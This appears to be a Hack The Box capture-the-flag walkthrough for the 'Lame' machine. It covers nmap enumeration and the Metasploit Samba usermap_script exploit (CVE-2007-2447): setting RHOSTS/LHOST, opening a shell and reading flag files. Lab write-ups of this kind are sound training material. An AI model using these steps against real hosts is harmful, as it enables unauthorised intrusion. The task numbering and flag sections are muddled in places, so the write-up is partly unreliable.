## Lame – Hack The Box Walkthrough

In this writeup, I’ll walk through the exploitation of the HTB “Lame” machine.
The goal was to gain initial access and escalate privileges to root.

---

### **Task 1**
**How many of the nmap top 1000 TCP ports are open on the remote host?**

I started by running a basic `nmap` scan against the target to enumerate open TCP ports.

The scan revealed **four open ports** within the top 1000 TCP ports:
- **21/tcp** (FTP)
- **22/tcp** (SSH)
- **139/tcp** (NetBIOS-SSN)
- **445/tcp** (Microsoft-DS)

Therefore, the answer to this task is **4**.

---

### **Task 2**
**What version of VSFTPd is running on Lame?**

To identify the version of the FTP service running on the target, I performed an `nmap` scan with service version detection enabled using the `-sV` option.
While a basic scan only reveals that an FTP service is running on port 21, enabling `-sV` allows nmap to actively query the service and extract banner information in order to determine the exact software and version.
The scan revealed that the FTP service is **vsftpd version 2.3.4**, which is a known vulnerable version associated with a publicly documented backdoor.
Therefore, the version of VSFTPd running on Lame is **2.3.4**.

---

### **Task 4**
**What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".**

In addition to service version detection, I enabled the default NSE scripts
using the `-sC` option to gather additional contextual information about therunning services.
As shown in the following output line:
OS: Unix (Samba 3.0.20-Debian)
the Samba version running on the host is **3.0.20**.

---

### **Initial Access – Exploiting Samba (CVE-2007-2447)**

#### **Step 1: I found a vulnerable Samba service**
From the initial scan, I saw that the machine was running Samba version 3.0.20.This version is known to be vulnerable.
The search returned the following relevant module:
exploit/multi/samba/usermap_script

#### **Step 2: Identifying and selecting exploit module**
From the search results, the Samba exploit appeared as result number 0 in the list.
This meant I could interact with it using its index number.
Then i ran:
use 0.

#### **Step 3: Reviewing the exploit options**
Before running the exploit, I reviewed the required options to see what needed to be configured:
show-options
This showed that the target host (RHOSTS) needed to be set.

#### **Step 4: Setting the target IP address**
I configured the target machine’s IP address:
set RHOSTS 10.129.47.108
This tells Metasploit which remote host should be attacked.

#### **Step 5: Setting the target IP address**
set the local host accordingly to my IP adress:
set LHOST 10.10.15.26

#### **Step 6: Running the exploit**
After configuring the required options, I executed the exploit:
exploit

**command shell opend on the target system**

---

### **Task 6**
**Exploiting CVE-2007-2447 returns a shell as which user?**

I verified which user the shell was running as
whoami

---

### **Task 7**
**Submit the flag located in the makis user's home directory.**

With root privileges, I was able to navigate the file system and access protected directories, including:
cd /root
ls
cat root.txt

---

### **Task 8**
**Submit the flag located in root's home directory.**

I also accessed the user flag:
cd /home/makis
ls
cat user.txt
